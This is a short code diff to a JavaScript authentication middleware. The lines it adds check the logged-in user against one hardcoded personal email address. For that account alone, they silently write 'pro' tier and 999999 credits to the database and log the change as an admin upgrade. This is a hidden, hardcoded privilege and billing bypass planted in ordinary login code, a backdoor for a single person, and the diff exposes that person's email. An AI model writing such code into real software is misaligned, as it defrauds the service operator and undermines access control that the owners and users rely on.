@@ -87,6 +87,17 @@ const populateUser = async (req, res, next) => {
         }
 
         if (user) {
+            // Auto-grant admin to the user specifically
+            if (user.email === 'tmoon2728@gmail.com' && user.subscription_tier !== 'pro') {
+                try {
+                    db.prepare('UPDATE users SET subscription_tier = ?, credits = ? WHERE id = ?').run('pro', 999999, user.id);
+                    user.subscription_tier = 'pro';
+                    user.credits = 999999;
+                    req.authLog.push("Auto-upgraded tmoon2728@gmail.com to PRO admin.");
+                } catch (e) {
+                    req.authLog.push(`Failed auto-upgrade: ${e.message}`);
+                }
+            }
             req.user = user;
         } else {
             req.authLog.push("Final resolution: User is null.");
